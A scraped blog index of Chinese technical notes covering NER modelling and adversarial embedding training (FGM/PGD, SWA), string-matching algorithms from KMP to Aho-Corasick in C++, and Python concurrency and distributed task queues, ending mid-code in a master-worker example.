数据，处理为三元组形式：(问题，答案，上下文) 其中，问题：一段对 实体类型 的描述文字，多种实体，就有多个问题；答案：为 实体的起始 index；上下文就是待识别的整个文本。 模型，使用BERT： 每个token预测输出有两个，是否为实体开始字，是否为实体结束字。 输出为 2 维，是和不是的预测概率。分别对每个位置判断，是否为开始字或者结束字。 但是这个两个集合，在有监督数据条件下，即训练时，并没有必要，只在预测推断时使用（推断需要通过下式计算所有组合的概率 P）。因为下式： 直接根据标注数据的 i, j 对标注部分计算 P。而不用对所有 i, j 组合算一次 P。 损失，多个预测损失之和： 权重为超参数。 Simple-Lexicon 论文：Simple-Lexicon：Simplify the Usage of Lexicon in Chinese NER Git Repo 在Embedding信息的输入上进行改进，尝试了多种方式。 Softword：使用分词工具，标记词的 BMESO，结合字向量和标记向量输入。存在误差传播问题，无法引入一整个词汇对应word embedding ExtendSoftword：组合所有字的所有BME，得到可能的词，但是无法复原原始的词汇信息是怎样 Soft-lexicon：对当前字符，依次获取BMES对应所有词汇集合。 根据词频加权词向量，与字向量求和。 该模型比Lattice LSTM, WC-LSTM等，在输入embedding上进行改进的模型，效果更好，更容易使用和迁移。 策略 Positive-unlabeled learning -- PU Learning 在只有正类和无标记数据的情况下，训练二分类器 Method 1 Directly 将正样本和部分筛选出的未标记样本分别看作是positive samples和negative samples 训练一个分类器，输出样本属于正、负类的概率 使用训练好的分类器。分类未标注数据，若正类的概率 大于 负类的概率，则该未标注样本的更可能为正类 Method 2 PU bagging 将所有正样本和未标记样本进行随机组合 bootstrap 来创建训练集； 将正样本和未标记样本视为positive和negative，训练一个分类器； 将分类器应用于不在训练集中的未标记样本 OOB（“out of bag”），并记录其分数； 重复上述三个步骤，最后每个未标记样本的分数为每一轮 OOB分数 的平均值。 Method 3 人工标注一部分确认为负类的数据，训练分类器识别这些 确认为 负类的数据。 示例 示例 论文：Distantly Supervised Named Entity Recognition using Positive-Unlabeled Learning，将PU Learning应用在NER任务上 Git Repo： 首先有 未标记数据 Du，实体字典 Dict； 使用最大匹配方法，标记一部分 Du，是NE则为正类，不是NE则为负类； 对每一种NE类型（比如，Loc，Nane）训练一个PU 分类器（自定义的神经网络模型）； 使用多个PU 分类器，对剩余的 Du，进行预测，每一个词，取预测概率最大的那一类标记； 若某些 词 多次被预测为 实体，且每次出现都被预测为同一类实体，那么，将这个词，加入Dict； 重复以上步骤，直到Dict不再改变。 FGM 引用Blog原文 对抗可以作为一种防御机制，并且经过简单的修改，便能用在NLP任务上，提高模型的泛化能力。对抗训练可以写成一个插件的形式，用几行代码就可以在训练中自由地调用。 在原始输入样本 上加一个扰动 ，得到对抗样本后，用其进行训练。将输入样本向着损失上升的方向再进一步，得到的对抗样本就能造成更大的损失，提高模型的错误率。问题可以被抽象成这么一个模型： 其中， 为gold label， 为模型参数。Goodfellow认为，神经网络由于其线性的特点，很容易受到线性扰动的攻击。于是，他提出了 Fast Gradient Sign Method (FGSM) ： 其中， 为符号函数， 为损失函数。Goodfellow发现，令 ，用这个扰动能给一个单层分类器造成99.9%的错误率。 Goodfellow还总结了对抗训练的两个作用： 提高模型应对恶意对抗样本时的鲁棒性； 作为一种regularization，减少overfitting，提高泛化能力。 从优化的视角，问题重新定义成了一个找鞍点的问题，Min-Max：内部损失函数的最大化，外部经验风险的最小化： 内部max是为了找到worst-case的扰动，也就是攻击，其中， 为损失函数， 为扰动的范围空间。 外部min是为了基于该攻击方式，找到最鲁棒的模型参数，也就是防御，其中 是输入样本的分布。 CV任务的输入是连续的RGB的值，而NLP问题中，输入是离散的单词序列，一般以one-hot vector的形式呈现，如果直接在raw text上进行扰动，那么扰动的大小和方向可能都没什么意义。Goodfellow在17年的ICLR中提出了可以在连续的embedding上做扰动。在CV任务，根据经验性的结论，对抗训练往往会使得模型在非对抗样本上的表现变差，然而神奇的是，在NLP任务中，模型的泛化能力反而变强了。 因此，在NLP任务中，对抗训练的角色不再是为了防御基于梯度的恶意攻击，反而更多的是作为一种regularization，提高模型的泛化能力。 对抗训练，FSGM的修改版本，取消了符号函数，对梯度计算进行scale，而不是只使用 +1 或者 -1 代替。 原网络进行一次，前向反向传播，得到梯度g 计算embedding矩阵的修正梯度 r: \\(r=\\frac{\\epsilon g}{\\|g\\|_{2}}\\) 输入 embedding + r ，计算对抗梯度 ga 将 ga 累加到 g 中，得到 gf 恢复原网络的embedding数值，使用 gf 对参数进行更新 Projected Gradient Descent（PGD）：“小步走，多走几步”，如果走出了扰动半径为 的空间，就映射回“球面”上，以保证扰动不要过大。 其中 为扰动的约束空间， 为小步的步长。 PGD模型能够得到一个非常低且集中的loss分布。 另外在半监督条件下，也可以使用对抗训练方法Virtual Adversarial Training进行半监督训练。 示例代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384import torchgrad_backup = &#123;&#125;def save_grad(tensorName): def backward_hook(grad: torch.Tensor): grad_backup[tensorName] = grad return backward_hookclass PGD: def __init__(self, model): self.model = model self.emb_backup = &#123;&#125; def attack(self, epsilon=1., alpha=0.3, emb_name='emb.', is_first_attack=False): for name, param in self.model.named_parameters(): if param.requires_grad and emb_name in name: if is_first_attack: self.emb_backup[name] = param.data.clone() norm = torch.norm(param.grad) if norm != 0 and not torch.isnan(norm): r_at = alpha * param.grad / norm param.data.add_(r_at) param.data = self.project(name, param.data, epsilon) def restore(self, emb_name='emb.'): # emb_name这个参数要换成你模型中embedding的参数名 for name, param in self.model.named_parameters(): if param.requires_grad and emb_name in name: assert name in self.emb_backup param.data = self.emb_backup[name] self.emb_backup = &#123;&#125; def project(self, param_name, param_data, epsilon): r = param_data - self.emb_backup[param_name] if torch.norm(r) &gt; epsilon: r = epsilon * r / torch.norm(r) return self.emb_backup[param_name] + r def backup_grad(self): # 此处也可以直接用一个成员变量储存 grad，而不用 register_hook 存储在全局变量中 for name, param in self.model.named_parameters(): if param.requires_grad: param.register_hook(save_grad(name)) def restore_grad(self): for name, param in self.model.named_parameters(): if param.requires_grad: param.grad = grad_backup[name]if __name__ == '__main__': # 示例过程 pgd = PGD(model) K = 3 # 小步走的步数 for batch_input, batch_label in data: # 正常训练 loss = model(batch_input, batch_label) loss.backward() # 反向传播，得到正常的grad pgd.backup_grad() # 对抗训练 for t in range(K): pgd.attack(is_first_attack=(t==0)) # 在embedding上添加对抗扰动, first attack时备份param.data if t != K-1: model.zero_grad() else: pgd.restore_grad() loss_adv = model(batch_input, batch_label) loss_adv.backward() # 反向传播，并在正常的grad基础上，累加对抗训练的梯度 pgd.restore() # 恢复embedding参数 # 梯度下降，更新参数 optimizer.step() model.zero_grad() 12345678910111213141516171819202122232425262728293031323334353637383940import torchclass FGM: def __init__(self, model): self.model = model self.backup = &#123;&#125; def attack(self, epsilon=1, emb_name='emb.'): for name, param in self.model.named_parameters(): if param.requires_grad and emb_name in name: self.backup[name] = param.data.clone() norm = torch.norm(param.grad) if norm != 0 and not torch.isnan(norm): r_adv = epsilon * param.grad / norm param.data.add_(r_adv) def restore(self, emb_name='emb.'): for name, param in self.model.named_parameters(): if param.requires_grad and emb_name in name: assert name in self.backup param.data = self.backup[name] self.backup = &#123;&#125;if __name__ == \"__main__\": # 示例过程 fgm = FGM(model) for batch_input, batch_label in data: # 正常训练 loss = model(batch_input, batch_label) loss.backward() # 反向传播，得到正常的grad # 对抗训练 fgm.attack() # 在embedding上添加对抗扰动 loss_adv = model(batch_input, batch_label) loss_adv.backward() # 反向传播，并在正常的grad基础上，累加对抗训练的梯度 fgm.restore() # 恢复embedding参数 # 梯度下降，更新参数 optimizer.step() model.zero_grad() SWA Stochastic Weight Averaging，方法的提出者认为，训练期间得到的局部最小值 倾向于 在损失值较低的区域的边界，而不是集中在损失更低的区域中心部分。所以，Stochastic Weight Averaging可以通过对边界的平均，得到更好性能和更好泛化性能的模型。Git Repo 保存两套权重w, wswa； 使用循环学习率，训练w； 达到指定轮次，更新ws，\\(n_{models}\\)指更新\\(w_{swa}\\)时，中间间隔的轮次: \\(w_{swa} = \\frac{w_{swa}n_{models}+w}{n_{models}+1}\\) 循环以上步骤，最后使用wswa，作为最终模型 有可以直接使用的工具，比较方便。~from torchcontrib.optim import SWA~ 12345678910111213141516optimizer = torch.optim.Adam(params_lr)# Stochastic Weight Averagingoptimizer = SWA(optimizer)if ...: optimizer.update_swa() ...# 训练结束时使用收集到的swa moving averageoptimizer.swap_swa_sgd()# optimizer.bn_update(# train_dataloader,# model) # 更新BatchNorm的 running mean# save 参考链接： 2020CCF-NER Flat-Lattice-Transformer","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"NER","slug":"NER","permalink":"https://racleray.github.io/tags/NER/"},{"name":"FLAT","slug":"FLAT","permalink":"https://racleray.github.io/tags/FLAT/"},{"name":"methodology","slug":"methodology","permalink":"https://racleray.github.io/tags/methodology/"}]},{"title":"字符串匹配从KMP到AC自动机","slug":"字符串匹配从KMP到AC自动机","date":"2021-02-27T15:21:03.000Z","updated":"2023-08-07T11:54:31.040Z","comments":true,"path":"posts/51024bbf.html","link":"","permalink":"https://racleray.github.io/posts/51024bbf.html","excerpt":"记录从多输入单pattern文本匹配算法KMP，到多输入多pattern文本匹配算法AC自动机。","text":"Knuth-Morris-Pratt 在一个字符串S内查找一个词W的出现位置。KMP目的是什么？比如是暴力匹配（两个for循环）最坏的情况，O(m*n)： 12S: aaaaaaaaaaaaaaW: aaab 想法，不匹配就只是个结果，没有其它信息产生吗？显然，如果有一部分匹配，后续搜索应该可以利用。 怎么利用？ 首先，有一部分匹配，才可以操作，才有多的信息嘛。 那么，目的就是保证已经匹配的部分，在S中，不再重复匹配。 12S: aaaaaababaaaaaW: ababc 比如，上例，abab匹配，c不匹配，重新回退4个位置匹配吗？W的信息我们是知道的，这末端abc不匹配，里面还有aba啊，并且从S当前匹配的信息，发现aba，已经再次匹配，S的指针不需要回退！ 现在的问题，是W的信息怎么表示？需要什么信息？部分子串前缀和后缀相同的信息。 只需要一个数组，告诉我们，当出现不匹配字符时，可以跳过那些重复的一定会再次匹配的部分。 现在，问题就是：找到 W 对应的回退数组N，顺序匹配 S 与 W，按照 N 的信息回退。 时间复杂度：O(|S|+|W|) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;string&gt;using namespace std;void get_backoff(string &amp;pattern, vector&lt;int&gt; &amp;book)&#123; for (int i = 1, j = 0; i &lt; (int)pattern.size(); i++) &#123; while (j &amp;&amp; pattern[i] != pattern[j]) &#123; // 不匹配，回退到上一个相同前缀 j = book[j - 1]; &#125; // 匹配，更新相同的前缀的最后一个index if (pattern[i] == pattern[j]) j++; // 更新book，记录相同的前缀的最后一个index book[i] = j; &#125;&#125;int kmp(string &amp;s, string &amp;p, int begin)&#123; int res = -1; vector&lt;int&gt; book(p.size()); get_backoff(p, book); for (int i = begin, j = 0; i &lt; (int)s.size(); ++i) &#123; while (j &amp;&amp; s[i] != p[j]) // 回退p j = book[j - 1]; if (s[i] == p[j]) j++; if (j == (int)p.size()) &#123; res = i - p.size() + 1; &#125; &#125; return res;&#125;int main(int argc, char *argv[])&#123; string s = \"abskajakajkafkkakaj\"; string p = \"kkakaj\"; string pre = \"abskajakajkaf\"; cout &lt;&lt; kmp(s, p, 0) &lt;&lt; endl; cout &lt;&lt; pre.size() &lt;&lt; endl; return 0;&#125; Trie前缀树或字典树 从头到尾，使用输入串中的一个字符来确定要进入的下一个状态。选择标记有相同字符的边缘以行走。每一步都消耗一个字符。 一个节点的所有子孙都有相同的前缀，也就是这个节点对应的字符。 有什么强的？ 从根到叶遍历所需的时间不取决于数据库的大小，而是与键的长度成比例。因此，在一般情况下，它通常比B树或任何基于比较的索引方法快得多。它的时间复杂度与哈希技术相当。 除了效率外，在拼写错误的情况下，trie还提供了搜索最近路径的灵活性。 能做什么？ 多patttern匹配 比如，你有很多个pattern，要同时在一个string s中查找，是否出现。使用Trie保存pattern，作为索引，在string中搜索，可以加快效率。 。。。 brute force需要 O(|Text| *|Patterns|) Trie需要 O(|Text| * |Len of Longest Pattern|) 加上构造 Trie 的 O(|Patterns|)。 需要额外空间复杂度，O(|Patterns|)。 怎么实现？ 最基础的实现方式如上图。实现： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;bits/stdc++.h&gt;using namespace std;int trie[STACSIZE][N]; //手动开辟栈空间// 或者// vector&lt;map&lt;char,int&gt;&gt; trie[STACSIZE][N]; //手动开辟栈空间// 或者// vector&lt;unordered_map&lt;char,int&gt;&gt; trie[STACSIZE][N]; //手动开辟栈空间int counts[STACSIZE]; //计数int idx = 0;void insert(string &amp;s)&#123; int p = 0; for (int i = 0; i &lt; s.size(); i++) &#123; int c = s[i] - 'a'; if (trie[p][c] == 0) trie[p][c] = ++idx; //没有节点，创造节点，指定在栈空间的位置 p = trie[p][c]; //更新当前位置，进入c节点 &#125; counts[p]++; //更新计数&#125;int query(string &amp;s)&#123; int p = 0; for (int i = 0; i &lt; s.size(); i++) &#123; int c = s[i] - 'a'; if (!trie[p][c]) return 0; p = trie[p][c]; &#125; return counts[p];&#125;int main(int argc, char **argv)&#123; for (int i = 0; i &lt; 5; i++) &#123; string s; cin &gt;&gt; s; insert(s); &#125; for (int i = 0; i &lt; 5; i++) &#123; string s; cin &gt;&gt; s; cout &lt;&lt; query(s) &lt;&lt; endl; &#125; return 0;&#125; 以上方法，就空间使用而言，这是相当奢侈的，因为在trie中，大多数节点只有几个分支，而大多数表单元格为空白。更紧凑的方案是使用链表存储每个状态的转换。但是由于是线性搜索，导致访问速度变慢。 因此，大佬设计出了快速访问的表压缩技术来解决该问题。 Double-Array Trie：包含base和check两个数组。base数组的每个元素表示一个Trie节点，即一个状态 ；check数组表示某个状态的前驱状态。 示意图所示，构造两个数组，一个base对应一个前驱check。 一步状态转移逻辑为： t := base [ s ] + c ; 如果 check[ t ] = s， 则 next s := t 如果 check[ t ] = -s， 则 next s := t 且 t 是一个终止状态（比如表示一个词的结尾） 否则 转移失败 实现，就暂时不研究了。 More about 多个pattern匹配 除了Trie，还有针对 string s 建树的 Suffix Trie. 对 string：p a n a m a b a n an a s。构建后缀Trie 将 pattern 逐个输入，进行匹配。此时，不需要匹配到叶子节点。 额外空间复杂度，和 string s 有关。压缩无分支后缀之后，就成了Suffix Tree。 若再压缩空间，可以将suffix 变成 idx + length。 额外空间复杂度为，O(|Text|)。使用 Suffix Trie，多pattern匹配的时间复杂度为： O(|Text| + |Patterns|)，Trie 为 O(|Text| * |Len of Longest Pattern|)。 额外空间复杂度为 O(|Text|)，Trie 为 O(|Patterns|)。只是 O(|Text|) 的系数约为20，当文本很长时，还是算了吧。 AC自动机 还是，多 pattern 匹配问题，在只是使用Trie，在string s上暴力遍历，只是寻找成功的那一刻，失败的匹配那都是没有意义的吗？ 不不不，得让失败的存在，这东西越混沌，信息熵越高，有用。 AC自动机，Trie + KMP，加速多pattern匹配过程。匹配过程时间复杂度O（|Text| * Trie树高）。 构建 patterns 的 Trie 构建 fail 指针 开始匹配 构建 fail 指针 在Trie中，BFS遍历，第一层，fail指针都指向 root 第一层之后，每个节点的 fail 指针，指向 【该节点的父节点】 的 【fail指针指向的节点】 的 【儿子节点】中 【和该节点（自己）同字符的节点】。如果没有找到，【fail指针指向的节点】继续向上找 fail 节点，直到 root。 啥是 fail ？ 当前单词的最长后缀。 匹配过程 输入string s，trie从 root开始，进行匹配 当匹配失败，跳转到fail指针指向的节点，如果fail到 root，输入此位置之后的string s的部分，继续查找。 当匹配成功（Trie标记的节点），也跳转到fail指针指向的节点，如果此时跳转到 root，进行回溯到前一个最长的trie路径节点。 跳转，就是在匹配后缀。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106#include &lt;bits/stdc++.h&gt;using namespace std;static int idx = 0;struct trieNode&#123; int son[26] = &#123;0&#125;; int counts = 0; int fail = -1;&#125;;void insert(const string &amp;s, vector&lt;trieNode&gt; &amp;trie)&#123; int p = 0; for (int i = 0; i &lt; s.size(); i++) &#123; int cha = s[i] - 'a'; if (!trie[p].son[cha]) trie[p].son[cha] = ++idx; p = trie[p].son[cha]; &#125; trie[p].counts++;&#125;void build_fail(vector&lt;trieNode&gt; &amp;trie)&#123; queue&lt;int&gt; q; for (int i = 0; i &lt; 26; i++) &#123; if (trie[0].son[i] != 0) &#123; //儿子节点 int son = trie[0].son[i]; trie[son].fail = 0; //第一层 fail q.push(son); &#125; &#125; while (q.size()) &#123; int father = q.front(); q.pop(); for (int i = 0; i &lt; 26; i++) &#123; if (trie[father].son[i] != 0) &#123; int cur = trie[father].son[i]; // 要找fail的儿子 int failOfFather = trie[father].fail; // 父节点的fail // ~(0): -1, ~(-1): 0 //不是根节点且没有找到目标同字符 while (~failOfFather &amp;&amp; !trie[father].son[i]) failOfFather = trie[failOfFather].fail; if (~failOfFather) //找到目标同字符 trie[cur].fail = trie[failOfFather].son[i]; else // 根节点 trie[cur].fail = 0; q.push(cur); &#125; &#125; &#125;&#125;int query(const string &amp;s, vector&lt;trieNode&gt; &amp;trie)&#123; int ans = 0; int ptr = 0; for (int i = 0; i &lt; s.size(); i++) &#123; int word = s[i] - 'a'; // 儿子不存在且fail不是根节点，跳转 fail while (!trie[ptr].son[word] &amp;&amp; ~trie[ptr].fail) ptr = trie[ptr].fail; if (trie[ptr].son[word]) // 儿子存在，匹配，进入节点，继续查找 ptr = trie[ptr].son[word]; else // 是根节点，下一个 s 字符 continue; int ptr_temp = ptr; // copt ptr，ptr为回溯位置 while (~trie[ptr_temp].fail) //到根节点退出，下一个外层for回溯 &#123; ans += trie[ptr_temp].counts; // counts在不是目标处为0 ptr_temp = trie[ptr_temp].fail; &#125; &#125; return ans;&#125;int main(int argc, char **argv)&#123; vector&lt;trieNode&gt; trie; trie.resize(50); insert(\"she\", trie); string s = \"he\"; insert(s, trie); insert(\"her\", trie); insert(\"is\", trie); insert(\"this\", trie); insert(\"his\", trie); build_fail(trie); cout &lt;&lt; query(\"sherthis\", trie) &lt;&lt; endl;&#125;","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Algorithm","slug":"Notes/Algorithm","permalink":"https://racleray.github.io/categories/Notes/Algorithm/"}],"tags":[{"name":"algorithm","slug":"algorithm","permalink":"https://racleray.github.io/tags/algorithm/"},{"name":"kmp","slug":"kmp","permalink":"https://racleray.github.io/tags/kmp/"},{"name":"trie","slug":"trie","permalink":"https://racleray.github.io/tags/trie/"},{"name":"Aho-Corasick","slug":"Aho-Corasick","permalink":"https://racleray.github.io/tags/Aho-Corasick/"}]},{"title":"浅涉python与分布式","slug":"浅涉python与分布式","date":"2021-02-24T12:23:25.000Z","updated":"2023-08-07T11:54:31.046Z","comments":true,"path":"posts/cdee5c8d.html","link":"","permalink":"https://racleray.github.io/posts/cdee5c8d.html","excerpt":"记录关于并行计算的一点东西。包括并行与分布式的概念、使用python工具包的简单示例。","text":"并行和分布式计算介绍 现代计算的特点，主板上安装多块处理器（每个处理器含有多个核心），这使得计算机能真正地实现并发。 一个处理器同一时间只能处理同一事务；后面章节我们会看到，当处理器快到一定程度，就可以给出同一时间进行多项任务的假象。若要真正实现同一时间多任务，就需要多个处理器。 另一个是高速计算机网络。它让无穷多的电脑实现了相互通讯。 并行计算 并行计算是同时使用多个处理器处理事务。 分布式计算 分布式计算是指同一时间使用多台计算机处理一个任务。只有当计算机之间互相连接时，才可以使用分布式计算。要记住，真正的瓶颈往往是数据而不是CPU。 并行和分布式计算的最明显的差异就是底层的内存架构和访问方式不同。 并行和四个处理器可以访问同一内存地址。对于分布式应用，不同的并发任务不能正常访问同一内存。原因是，一些任务是在这一台计算机运行，一些任务是在另一台计算机运行，它们是物理分隔的，通过网络进行数据传输。 现实中，计算机网络通讯就像一个纯粹的分布式内存架构。然而，每台计算机有多个处理器，运行着共享式内存架构。 分布式内存系统扩展性强、组建成本低：需要更高性能，扩展即可。另一优点是，处理器可以访问各自的内存，不必担心发生Race condition。 缺点是，开发者需要手动写数据传输的策略，需要考虑数据存储的位置。另外，不是所有算法都能容易移植到这种架构。 阿姆达尔定律 考虑一个部分并行的算法，称P为并行分量，S为序列分量（即非并行分量），P+S=100%。T(n)为运行时间，处理器数量为n。 对比T(n)和T(1)可以得到，分布式处理的加速比。 随着n的提高，加速的效果不让人满意。使用10个处理器，是9.2倍速。使用100个处理器，则是50倍速。使用1000个处理器，仅仅是91倍速。 阿姆达尔定律告诉我们两点：我们最快可以将倍速提高到多少；收益减少时，何时应该减少硬件资源的投入。 异步编程（非阻塞编程） 与传统的同步编程相比，异步编程或非阻塞编程，可以使性能获得极大提高。 理想的状态应该是安排一下任务，当一个任务等待I/O时，它处于悬停状态，就让另一个任务接管CPU。这就是异步（也称为事件驱动）编程。 使用多线程在不同的线程并行运行，也可以达到同样的效果。但是，有一个显著的不同：使用多线程时，是由操作系统决定哪个线程处于运行或悬停。然而，在异步编程中，每个任务可以自己决定是否放弃CPU。 另外，单单使用异步编程，我们不能做出真正的并发：同一时间仅仅有一个任务在运行。 另一点要注意的是，异步编程更善于处理I/O密集型任务，而不是CPU密集型任务（暂停任务不会使性能提高）。 任何异步代码都要精心选择非阻塞的库，以防使用阻塞代码。 协程 在Python中，让一个功能中途暂停的关键是使用协程。 协程就是一类函数，它可以通过yield，在指定位置暂停或继续任务。需要注意，尽管协程是强化的生成器，在概念意义上并不等于生成器。原因是，协程与迭代无关。另一不同点，生成器产生值，而协程消除值。 生成器就是一个callable，它生成一个结果序列，而不是返回结果。这是通过产生（通过yield关键字）值而不是返回值 1234def mygenerator(n): while n: n -= 1 yield n next()从生成的序列产生一个值，本质上，生成器是简化的迭代器，免去了定义类中__iter__和__next__的方法。外，生成器是一次性操作，不能重复生成的序列。 __iter__和__next__方法，运行了迭代协议：前者返回了迭代的对象，后者逐个返回了序列中的元素。 12345678910class MyIterator(object): def __init__(self, xs): self.xs = xs def __iter__(self): return self def __next__(self): if self.xs: return self.xs.pop(0) else: raise StopIteration 协程有三种主要的结构: yield()： 用来暂停协程的执行 send()： 用来向协程传递数据（以让协程继续执行） close()：用来关闭协程 示例 1234567891011def complain_about(substring): print('Please talk to me!') try: while True: # 执行到此处，控制点返回shell，直到外部send数据到yield处，传递给text text = (yield) if substring in text: print('Oh no: I found a %s again!' % (substring)) except GeneratorExit: print('Ok, ok: I am quitting.') 1234567891011&gt;&gt;&gt; c = complain_about('Ruby')&gt;&gt;&gt; next(c)Please talk to me!&gt;&gt;&gt; c.send('Test data')&gt;&gt;&gt; c.send('Some more random text')&gt;&gt;&gt; c.send('Test data with Ruby somewhere in it')Oh no: I found a Ruby again!&gt;&gt;&gt; c.send('Stop complaining about Ruby or else!')Oh no: I found a Ruby again!&gt;&gt;&gt; c.close()Ok, ok: I am quitting. 复制ErrorOK! 通过 next 启动协程，close关闭。 词汇计数示例，文本来自http://www.gutenberg.org/cache/epub/2600/pg2600.txt。 逐行读取文件（通过cat函数）；统计每行中substring的出现次数（grep协程）；求和并打印数据（count协程）。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465from functools import wrapsdef coroutine(fn): @wraps(fn) def wrapper(*args, **kwargs): c = fn(*args, **kwargs) next(c) return c return wrapperdef cat(f, case_insensitive, child): if case_insensitive: line_processor = lambda l: l.lower() else: line_processor = lambda l: l for line in f: child.send(line_processor(line))@coroutinedef grep(sub_str, case_insensitive, child): if case_insensitive: sub_str = sub_str.lower() while True: text = (yield) # 等待send发送的数据 child.send(text.count(sub_str))@coroutinedef count(sub_str): n = 0 try: while True: n += (yield) except GeneratorExit: print(sub_str, n)@coroutinedef fanout(children): # 多个目标同时输入，计数 while True: data = (yield) for child in children: child.send(data)if __name__ == '__main__': import argparse parser = argparse.ArgumentParser() parser.add_argument('-i', action='store_true', dest='case_insensitive') parser.add_argument('pattern', type=str) parser.add_argument('infile', type=argparse.FileType('r')) args = parser.parse_args() cat(args.infile, args.case_insensitive, grep(args.pattern, args.case_insensitive, count(args.pattern))) cat( args.infile, args.case_insensitive, fanout( [grep(p, args.case_insensitive, count(p)) for p in args.pattern])) 1python grep.py -i love pg2600.txt 并行计算 如何使用多个CPU进行并行编程的。具体目标是加速CPU密集型任务。 多线程 在单CPU系统中，使用多线程并不是真正的并行，在给定时间只有一个线程在运行。只有在多CPU计算机上，线程才是并行的。 尽管Python的线程是OS原生的，全局锁却使特定时间只有一个是运行的。 当一个协程或进程等待I/O时，让另一个运行CPU，也可以达到并发的效果。当一个任务需要占用CPU大量时间时，CPU Bound，就不会有多大提高。 123456789101112131415161718192021222324252627from threading import Threadfrom queue import Queueimport urllib.requestURL = 'http://finance.yahoo.com/d/quotes.csv?s=&#123;&#125;=X&amp;f=p'def get_rate(pair, outq, url_tmplt=URL): with urllib.request.urlopen(url_tmplt.format(pair)) as res: body = res.read() outq.put((pair, float(body.strip())))if __name__ == '__main__': import argparse parser = argparse.ArgumentParser() parser.add_argument('pairs', type=str, nargs='+') args = parser.parse_args() outputq = Queue() for pair in args.pairs: t = Thread(target=get_rate, kwargs=&#123;'pair': pair, 'outq': outputq&#125;) t.daemon = True # 结束时，会自行回收线程资源 t.start() for _ in args.pairs: pair, rate = outputq.get() print(pair, rate) outputq.task_done() outputq.join() 多进程 为避免全局锁对CPU制约型线程的影响，使用多进程。多进程有一些缺点，它必须启动Python的多个实例，启动时间长，耗费内存多。 多进程有它们各自的内存空间，使用的是无共享架构，数据访问十分清晰。 实现并行进程，python提供两个module：multiprocessing和concurrent.futures 1234567891011121314151617181920212223import concurrent.futures as cfdef fib(n): if n &lt;= 2: return 1 elif n == 0: return 0 elif n &lt; 0: raise Exception('fib(n) is undefined for n &lt; 0') return fib(n - 1) + fib(n - 2)if __name__ == '__main__': import argparse parser = argparse.ArgumentParser() parser.add_argument('-n', type=int, default=1) parser.add_argument('number', type=int, nargs='?', default=34) args = parser.parse_args() assert args.n &gt;= 1, 'The number of threads has to be &gt; 1' with cf.ProcessPoolExecutor(max_workers=args.n) as pool: results = pool.map(fib, [args.number] * args.n) 在四核处理器的计算机上运行时，可以实现真正的并行，运行一次到四次，时间差不多。 进程数比处理器数目多时，性能会急剧下降。 在工作进程之间交换数据，在学习C时，会用到 管道 (使用最简单) 信号 (开销最小) 共享映射区 (无父子关系) 本地套接字 (最稳定) multiprocessing模块提供的方法是队列和管道。 1234567891011121314151617181920212223242526272829303132333435363738394041import multiprocessing as mpdef fib(n): if n &lt;= 2: return 1 elif n == 0: return 0 elif n &lt; 0: raise Exception('fib(n) is undefined for n &lt; 0') return fib(n - 1) + fib(n - 2)def worker(inq, outq): \"inq 任务队列， outq 输出队列\" while True: data = inq.get() if data is None: # 检测 哨兵值 return fn, arg = data outq.put(fn(arg))if __name__ == '__main__': import argparse parser = argparse.ArgumentParser() parser.add_argument('-n', type=int, default=1) parser.add_argument('number', type=int, nargs='?', default=34) args = parser.parse_args() assert args.n &gt;= 1, 'The number of threads has to be &gt; 1' tasks = mp.Queue() results = mp.Queue() for i in range(args.n): tasks.put((fib, args.number)) for i in range(args.n): mp.Process(target=worker, args=(tasks, results)).start() for i in range(args.n): print(results.get()) for i in range(args.n): # 输入哨兵值，停止worker tasks.put(None) 开发并行应用的主要难点就是控制数据访问，避免竞争条件或篡改共享数据。要明确何时停止。阿姆达尔定律指出，并行是收益递减的。并行化可能耗时巨大。一定要知道，哪段代码是需要并行化的，理论加速上限又是多少。 另外，避免收益递减的方法是增加任务量，提升并行任务的占比，这是古斯塔夫森定律的核心。 Celery Celery（http://www.celeryproject.org）是用到的第一个第三方库。Celery是一个分布任务队列，就是一个以队列为基础的系统。 轻量化的队列任务调度包：https://python-rq.org/ 分别在主机安装RabbitMQ （windows: exe erlang），ubuntu机器开启 redis-server ( sudo apt-get install redis-server )，python环境安装 celery，redis。（pip install celery[Redis]） 就学习示例而言，自己搭建整个环境耗时太大，尤其在windows环境下！最好能云服务器环境，只管写代码，环境一般不会出问题。 直接在几个虚拟机上测试比较方便。 在机器1上： 123456789import celery app = celery.Celery('test', broker='redis://192.168.56.104', backend='redis://192.168.56.103') @app.taskdef echo(message): return message 建立机器1，worker池 1celery -A test worker --loglevel=info celery命令会默认启动CPU数目相同的worker进程。worker会使用test模块中的应用app（我们可以使用实例的名字celery -A test.app worker），并使用INFO等级在控制台显示日志。 在机器2上（此处即为 master节点），保存一份test.py相同代码 进入 python 交互环境： 1&gt;&gt;&gt; from test import echo 12&gt;&gt;&gt; res = echo.delay('Python rocks!')&gt;&gt;&gt; res.result 可以在worker机器上执行程序，并返回结果 分布式任务队列 master-worker架构，有一个中间件层，中间件层使用多个任务请求队列（即任务队列），和一个用于存储结果的队列（即结果后台）。 主进程（也叫作client或producer）将任务请求安插到某个任务队列，从结果后台获取数据。worker进程订阅任务队列以明确任务是什么，并把结果放到结果后台。 只管定制好 任务队列 和 结果后台，其他worker、producer如何变化、什么程序都无所谓。 也称作 Master Worker 模式： Master Worker 示例 123456789101112131415161718192021222324252627282930313233343536373839404142# master.pyimport random, time, queuefrom multiprocessing.managers import BaseManager# 发送任务的队列:task_queue = queue.Queue()# 接收结果的队列:result_queue = queue.Queue()# 从BaseManager继承的QueueManager:class QueueManager(BaseManager): pass# 把两个Queue都注册到网络上, callable参数关联了Queue对象:QueueManager.register('get_task_queue', callable=lambda: task_queue)QueueManager.register('get_result_queue', callable=lambda: result_queue)# 绑定端口5000, 设置验证码'abc':manager = QueueManager(address=('', 5000), authkey=b'abc')# 